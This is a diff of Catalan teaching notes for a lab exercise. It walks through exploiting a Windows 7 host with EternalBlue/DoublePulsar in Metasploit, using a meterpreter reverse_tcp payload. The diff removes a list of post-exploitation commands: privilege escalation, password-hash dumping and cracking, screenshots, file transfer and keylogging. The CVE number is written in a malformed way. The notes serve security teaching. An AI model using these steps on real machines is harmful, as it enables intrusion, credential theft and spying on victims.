@@ -3,7 +3,7 @@
 !!!danger "Perill!!"
     No proveu açò fora d'un entorn didáctic. Podrieu cometrer un delicte...
 
-### Explotar vulnerabilitat `CVE-2017-010` amb Eternalblue i Doublepulsar des de Metasploit
+## Explotar vulnerabilitat `CVE-2017-010` amb Eternalblue i Doublepulsar des de Metasploit
 
 * Simplement utilitzem el següent exploit:
 
@@ -12,14 +12,5 @@
 * i payload `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
 
 Ja estem dins...
+
 * Comandaments:
-   * sysinfo
-    * pwd
-    * getuid
-    * migrate pid 
-    * getsystem
-    * hashdump -> crackstation(desxifra el md5)
-    * screenshot
-    * upload de kali a win7
-    * download de W7 a Kali.
-    * keyscan_start keyscan_dump.
